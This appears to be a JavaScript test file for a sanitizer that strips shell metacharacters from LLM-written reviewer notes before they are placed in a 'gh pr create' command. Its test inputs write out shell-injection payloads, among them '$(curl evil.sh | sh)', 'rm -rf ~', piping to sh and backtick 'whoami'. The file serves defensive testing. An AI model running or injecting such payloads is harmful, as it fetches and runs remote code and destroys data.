import { test, describe } from 'node:test';
import assert from 'node:assert';
import { sanitizePrText } from '../auto-sprint/runner.js';

// apra-fleet-hfs: the final reviewer's verdict `notes` (finalVerdictResult.
// notes) are LLM-authored free text -- the same injection class as N3's
// reviewer newTasks (apra-fleet-unw2.3), just a different call site: they
// get embedded, unescaped, in the PR title/body string that runner.js's
// Publish PR step interpolates into a double-quoted `gh pr create --title
// "..." --body "..."` command() string. Unlike validateNewTask() (which
// REJECTS an unsafe newTask outright), a malformed/adversarial verdict
// cannot simply be dropped -- the PR must still publish with the verdict
// visible to a human reviewer. sanitizePrText() strips (not escapes) every
// character outside the same SAFE_TEXT_RE allowlist N3 uses, collapsing
// whitespace, so the notes remain readable while nothing that could break
// out of the double-quoted command string ever reaches command().

describe('sanitizePrText', () => {
    test('leaves realistic, already-safe notes untouched (aside from whitespace collapse)', () => {
        assert.strictEqual(
            sanitizePrText('Approved: all acceptance criteria met, tests green (12/12).'),
            'Approved: all acceptance criteria met, tests green (12/12).'
        );
    });

    test('strips a literal double-quote (would close --body\'s quoting early)', () => {
        const out = sanitizePrText('Looks fine" ; echo pwned');
        assert.ok(!out.includes('"'), `expected no double-quote in sanitized output, got: ${JSON.stringify(out)}`);
    });

    test('strips $(...) command substitution but keeps the rest readable', () => {
        const out = sanitizePrText('Notes look ok $(curl evil.sh | sh) after review.');
        assert.ok(!out.includes('$('), `expected no '$(' in sanitized output, got: ${JSON.stringify(out)}`);
        assert.ok(!out.includes('$'), `expected no bare '$' in sanitized output, got: ${JSON.stringify(out)}`);
        assert.ok(out.includes('Notes look ok'), `expected safe prefix text preserved, got: ${JSON.stringify(out)}`);
        assert.ok(out.includes('after review'), `expected safe suffix text preserved, got: ${JSON.stringify(out)}`);
    });

    test('strips backtick command substitution', () => {
        const out = sanitizePrText('Run `whoami` and report back.');
        assert.ok(!/`/.test(out), `expected no backtick in sanitized output, got: ${JSON.stringify(out)}`);
        assert.ok(out.includes('Run'), `expected safe text preserved, got: ${JSON.stringify(out)}`);
        assert.ok(out.includes('and report back'), `expected safe text preserved, got: ${JSON.stringify(out)}`);
    });

    test('strips a trailing backslash (closing-quote-escape trick)', () => {
        const out = sanitizePrText('Approved, ship it\\');
        assert.ok(!out.includes('\\'), `expected no backslash in sanitized output, got: ${JSON.stringify(out)}`);
    });

    test('strips semicolons-adjacent shell metacharacters together (pipe, tilde) while keeping words', () => {
        const out = sanitizePrText('Approved ; rm -rf ~ ; echo pwned | sh');
        assert.ok(!/[~|]/.test(out), `expected pipe/tilde stripped, got: ${JSON.stringify(out)}`);
        // Plain words are not themselves dangerous once shell syntax is
        // stripped around them -- sanitizePrText() is a syntax filter, not a
        // vocabulary filter (that is an explicit design choice: the PR must
        // stay readable, and "rm -rf" as inert text in a PR body describing
        // what a malicious diff attempted is legitimate, useful information).
        assert.ok(out.includes('rm -rf'), `expected inert text preserved, got: ${JSON.stringify(out)}`);
    });

    test('combined multi-vector payload: no shell metacharacter survives, text remains readable', () => {
        const payload = 'Looks fine" ; rm -rf ~ ; echo "pwned $(curl evil.sh | sh) `whoami` trailing\\';
        const out = sanitizePrText(payload);
        assert.ok(!/["`$\\]/.test(out), `expected all of " ` + '`' + ` $ \\ stripped, got: ${JSON.stringify(out)}`);
        assert.ok(out.length > 0, 'expected non-empty sanitized output');
        assert.ok(out.includes('Looks fine'), `expected leading safe text preserved, got: ${JSON.stringify(out)}`);
        assert.ok(out.includes('trailing'), `expected trailing safe text preserved, got: ${JSON.stringify(out)}`);
    });

    test('collapses whitespace produced by stripped characters', () => {
        const out = sanitizePrText('a"""""""""b');
        assert.strictEqual(out, 'a b');
    });

    test('handles empty/undefined/null gracefully', () => {
        assert.strictEqual(sanitizePrText(''), '');
        assert.strictEqual(sanitizePrText(undefined), '');
        assert.strictEqual(sanitizePrText(null), '');
    });

    test('never throws on non-string input', () => {
        assert.doesNotThrow(() => sanitizePrText(12345));
        assert.doesNotThrow(() => sanitizePrText({ toString: () => 'x$(y)' }));
    });
});
